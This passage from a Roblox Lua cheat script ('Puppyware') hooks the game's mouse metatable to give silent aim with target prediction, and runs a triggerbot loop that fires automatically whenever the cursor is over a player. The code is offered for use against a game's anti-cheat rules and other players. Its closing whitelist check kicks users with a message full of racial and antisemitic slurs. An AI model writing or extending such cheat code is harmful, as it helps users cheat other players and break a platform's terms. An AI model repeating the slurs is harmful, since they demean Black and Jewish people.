            if PuppywareSettings.Aiming.SilentAim.Enabled and ChanceTable(PuppywareSettings.Aiming.AimingSettings.HitChanceAmount) == "HitPercent" then
                local NearestTarget, NearestDistance = NearestType(PuppywareSettings.Aiming.SilentAim.UseNearestDistance and "Distance" or "Mouse")
    
                if NearestTarget and (not PuppywareSettings.Aiming.SilentAim.GrabbedCheck or not Grabbing(NearestTarget)) and (not PuppywareSettings.Aiming.SilentAim.KnockedOutCheck or not Knocked(NearestTarget)) and (not PuppywareSettings.Aiming.SilentAim.ShowFOV or PuppywareSettings.Aiming.FOV.SilentAimSize > NearestDistance) and (not PuppywareSettings.Aiming.SilentAim.WallCheck or IsVisible(NearestTarget.Character.Head.Position, {NearestTarget.Character, LocalPlayer.Character, CurrentCamera}) == true) then
                    local TargetPart = (NearestTarget.Character.Humanoid:GetState() == Enum.HumanoidStateType.Freefall and NearestTarget.Character.LeftFoot or NearestTarget.Character[RandomTable(PuppywareSettings.Aiming.SilentAim.Hitboxes)])
                    local Prediction = (PuppywareSettings.Aiming.RageSection.MovementPrediction and TargetPart.CFrame + (TargetPart.Velocity * PuppywareSettings.Aiming.RageSection.MovementPredictionAmount) or TargetPart.CFrame + (TargetPart.Velocity * PuppywareSettings.Aiming.AimingSettings.GetVelocity))
    
                    return (tostring(key) == "Hit" and Prediction or tostring(key) == "Target" and TargetPart)
                end
            end
        end
        
    end

    return __index(self, key)
end)

while wait() do
    if PuppywareSettings.Aiming.TriggerBot.Enabled then
        for i, v in next, Players:GetPlayers() do 
            if Alive(v) then 
                if Mouse.Target:IsDescendantOf(v.Character) then 
                    mouse1press()
                    wait()
                    mouse1release()
                    if PuppywareSettings.Aiming.TriggerBot.Delay then
                        wait(PuppywareSettings.Aiming.TriggerBot.DelayAmount)
                    end
                end 
            end
        end
    end
end 

else
    plr:kick("XD NIGGA JEW NIGGA NIGGER XD OWO Not Whitelisted")
end
